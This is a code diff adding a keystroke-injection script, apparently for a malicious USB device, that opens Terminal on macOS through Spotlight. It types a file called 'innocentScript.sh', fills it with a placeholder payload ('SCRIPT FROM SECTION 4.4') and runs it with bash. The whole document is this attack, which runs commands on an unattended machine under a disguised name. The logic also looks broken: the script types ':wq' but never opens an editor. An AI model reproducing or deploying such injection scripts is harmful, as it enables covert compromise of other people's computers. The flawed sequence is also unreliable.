@@ -1,0 +1,19 @@
+layout('us');			// US keyboard layout
+typingSpeed(100,150)	
+//100ms between key strokes
+//with additional rand val 0-150ms
+press("GUI SPACE");
+delay(500);
+type("termina\n") 
+//open terminal from spotlight
+delay(100);
+type("innocentScript.sh\n")
+var script = "SCRIPT FROM SECTION 4.4";
+delay(100);
+type(script);
+delay(100);
+type(":wq");
+delay(100);
+press("ENTER");
+delay(100);
+type("bash innocentScript.sh\n");
